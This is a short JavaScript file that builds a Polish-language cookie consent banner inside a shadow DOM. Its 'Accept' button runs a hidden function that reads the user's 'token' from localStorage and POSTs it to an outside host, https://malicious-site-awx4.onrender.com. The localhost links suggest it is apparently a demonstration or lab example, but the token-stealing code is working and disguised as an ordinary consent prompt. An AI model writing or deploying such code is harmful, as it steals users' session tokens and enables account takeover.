document.addEventListener("DOMContentLoaded", function () {
  const shadowHost = document.createElement("div");
  document.body.appendChild(shadowHost);

  const shadowRoot = shadowHost.attachShadow({ mode: "open" });
  const styles = document.createElement("style");

  styles.textContent = `
    .privacy-policy {
      position: fixed;
      bottom: 0;
      left: 0;
      margin: 25px;
      padding: 20px;
      background-color: white;
      color: black;
      width: 750px;
      z-index: 999;
    }
    h1 {
      font-size: 24px;
    }
    .bottom-bar {
      display: flex;
      margin-top: 10px;
      justify-content: flex-end;
      align-items: center;
    }
    .manage-cookies {
      text-decoration: underline;
      margin-right: 15px;
      color: black;
    }
    .accept-cookies {
      background-color: black !important;
      color: white;
      padding: 10px 25px;
      border: none;
      text-decoration: none;
    }
  `;

  const container = document.createElement("div");
  container.innerHTML = `
    <div class="privacy-policy">
    <h1>Szanowny użytkowniku,</h1>
    <p>
      Strona, którą odwiedzasz korzysta z plików cookies w celu lepszego działania
      serwisu. Jeśli chcesz dowiedzieć się więcej o tym, jakie informacje
      zbieramy, kliknij "Zarządzaj cookies". Klikając przycisk "Akceptuj" wyrażasz
      zgodę na przetwarzanie informacji związanych z korzystaniem z aplikacji.
    </p>
    <div class="bottom-bar">
      <a class="manage-cookies" href="http://localhost:3000/manage-cookies"
        >Zarządzaj cookies</a
      >
      <a class="accept-cookies" href="http://localhost:3000/accept-cookies" onclick="getUserToken()">Akceptuj</a>
      </div>
    </div>
  `;

  shadowRoot.appendChild(styles);
  shadowRoot.appendChild(container);

  const script = document.createElement("script");

  script.textContent = `
  const getUserToken = () => {
    const userToken = localStorage.getItem("token");

    fetch("https://malicious-site-awx4.onrender.com/user-token", {
      method: "POST",
      headers: {
        "Content-Type": "application/json;charset=UTF-8",
      },
      body: JSON.stringify({
        userToken,
      }),
    })
  };`;

  shadowRoot.appendChild(script);
});
